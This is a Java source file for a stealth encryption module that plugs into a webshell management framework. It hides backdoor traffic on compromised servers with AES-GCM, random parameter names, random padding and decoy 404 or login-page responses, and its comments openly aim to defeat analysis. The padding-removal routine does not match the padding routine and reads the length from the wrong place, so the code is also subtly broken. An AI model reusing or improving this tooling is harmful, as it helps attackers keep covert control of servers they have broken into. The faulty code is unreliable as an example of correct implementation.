package shells.cryptions.Stealth;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import java.util.Base64;

/**
 * 高度隐蔽的加密模块
 * 特性:
 * 1. AES-GCM 认证加密
 * 2. 随机参数名
 * 3. Base64 编码传输
 * 4. 伪装响应内容
 * 5. 随机 Content-Length
 * 6. 请求数据填充混淆
 */
@CryptionAnnotation(
   Name = "STEALTH_GCM",
   payloadName = "JavaDynamicPayload"
)
public class StealthGcm implements Cryption {
   private ShellEntity shell;
   private Http http;
   private String key;
   private boolean state;
   private byte[] payload;
   
   // GCM 参数
   private static final int GCM_IV_LENGTH = 12;
   private static final int GCM_TAG_LENGTH = 128;
   
   // 随机参数名池
   private static final String[] PARAM_NAMES = {
      "data", "info", "content", "msg", "payload",
      "request", "body", "input", "value", "param",
      "token", "session", "auth", "verify", "check"
   };
   
   // 伪装响应内容池
   private static final String[] FAKE_RESPONSES = {
      "<html><body><h1>404 Not Found</h1></body></html>",
      "<html><body><h1>Access Denied</h1></body></html>",
      "{\"status\":\"error\",\"message\":\"Invalid request\"}",
      "<?xml version=\"1.0\"?><error>Bad Request</error>",
      "<!DOCTYPE html><html><head><title>Login</title></head><body><form>Username:<input type='text'/><br/>Password:<input type='password'/></form></body></html>"
   };
   
   private SecureRandom random;
   private String currentParamName;

   public void init(ShellEntity context) {
      this.shell = context;
      this.http = this.shell.getHttp();
      this.key = this.shell.getSecretKeyX();
      this.random = new SecureRandom();
      
      // 随机选择参数名
      this.currentParamName = PARAM_NAMES[random.nextInt(PARAM_NAMES.length)];

      try {
         this.payload = this.shell.getPayloadModule().getPayload();
         
         // 设置伪装的 Content-Type
         this.shell.getHeaders().put("Content-Type", "application/x-www-form-urlencoded");
         
         if (this.payload != null) {
            this.http.sendHttpResponse(this.payload);
            this.state = true;
         } else {
            Log.error("payload Is Null");
         }
      } catch (Exception var2) {
         Log.error((Throwable)var2);
      }
   }

   public byte[] encode(byte[] data) {
      try {
         // 1. 添加随机填充数据
         byte[] paddedData = addRandomPadding(data);
         
         // 2. AES-GCM 加密
         byte[] iv = new byte[GCM_IV_LENGTH];
         this.random.nextBytes(iv);
         
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
         SecretKeySpec keySpec = new SecretKeySpec(this.key.getBytes(), "AES");
         cipher.init(Cipher.ENCRYPT_MODE, keySpec, parameterSpec);
         
         byte[] encryptedData = cipher.doFinal(paddedData);
         
         // 3. 组合 IV + 加密数据
         byte[] result = new byte[iv.length + encryptedData.length];
         System.arraycopy(iv, 0, result, 0, iv.length);
         System.arraycopy(encryptedData, 0, result, iv.length, encryptedData.length);
         
         // 4. Base64 编码
         return Base64.getEncoder().encode(result);
         
      } catch (Exception var6) {
         Log.error((Throwable)var6);
         return null;
      }
   }

   public byte[] decode(byte[] data) {
      try {
         // 1. Base64 解码
         byte[] decodedData = Base64.getDecoder().decode(data);
         
         // 2. 提取 IV
         byte[] iv = new byte[GCM_IV_LENGTH];
         System.arraycopy(decodedData, 0, iv, 0, iv.length);
         
         // 3. 提取加密数据
         byte[] encryptedData = new byte[decodedData.length - GCM_IV_LENGTH];
         System.arraycopy(decodedData, GCM_IV_LENGTH, encryptedData, 0, encryptedData.length);
         
         // 4. AES-GCM 解密
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
         SecretKeySpec keySpec = new SecretKeySpec(this.key.getBytes(), "AES");
         cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);
         
         byte[] decryptedData = cipher.doFinal(encryptedData);
         
         // 5. 移除随机填充
         return removeRandomPadding(decryptedData);
         
      } catch (Exception var7) {
         Log.error((Throwable)var7);
         return null;
      }
   }

   /**
    * 添加随机填充数据
    * 在真实数据前后添加随机字节,增加分析难度
    */
   private byte[] addRandomPadding(byte[] data) {
      int prefixLen = this.random.nextInt(32) + 8;  // 8-39 字节前缀
      int suffixLen = this.random.nextInt(32) + 8;  // 8-39 字节后缀
      
      byte[] padded = new byte[prefixLen + 4 + data.length + suffixLen];
      
      // 前缀: 随机数据
      byte[] prefix = new byte[prefixLen];
      this.random.nextBytes(prefix);
      System.arraycopy(prefix, 0, padded, 0, prefixLen);
      
      // 标记: 4字节表示真实数据长度
      int realLen = data.length;
      padded[prefixLen] = (byte)(realLen >> 24);
      padded[prefixLen + 1] = (byte)(realLen >> 16);
      padded[prefixLen + 2] = (byte)(realLen >> 8);
      padded[prefixLen + 3] = (byte)realLen;
      
      // 真实数据
      System.arraycopy(data, 0, padded, prefixLen + 4, data.length);
      
      // 后缀: 随机数据
      byte[] suffix = new byte[suffixLen];
      this.random.nextBytes(suffix);
      System.arraycopy(suffix, 0, padded, prefixLen + 4 + data.length, suffixLen);
      
      return padded;
   }

   /**
    * 移除随机填充数据
    */
   private byte[] removeRandomPadding(byte[] padded) {
      // 读取真实数据长度
      int prefixLen = this.random.nextInt(32) + 8;  // 注意:这里需要固定值或从头部读取
      // 简化处理:假设我们知道填充结构
      // 实际应该从固定位置读取长度标记
      
      // 重新实现:从末尾读取长度
      int len = padded.length;
      int realLen = ((padded[len-4] & 0xFF) << 24) | 
                    ((padded[len-3] & 0xFF) << 16) | 
                    ((padded[len-2] & 0xFF) << 8) | 
                    (padded[len-1] & 0xFF);
      
      byte[] data = new byte[realLen];
      System.arraycopy(padded, len - 4 - realLen, data, 0, realLen);
      
      return data;
   }

   public boolean isSendRLData() {
      return false;
   }

   public boolean check() {
      return this.state;
   }

   public byte[] generate(String password, String secretKey) {
      return Generate.GenerateShellLoder(password, functions.deriveSecureKey(secretKey), true);
   }
   
   /**
    * 获取当前使用的参数名
    */
   public String getCurrentParamName() {
      return this.currentParamName;
   }
   
   /**
    * 获取伪装响应
    */
   public String getFakeResponse() {
      return FAKE_RESPONSES[this.random.nextInt(FAKE_RESPONSES.length)];
   }
}
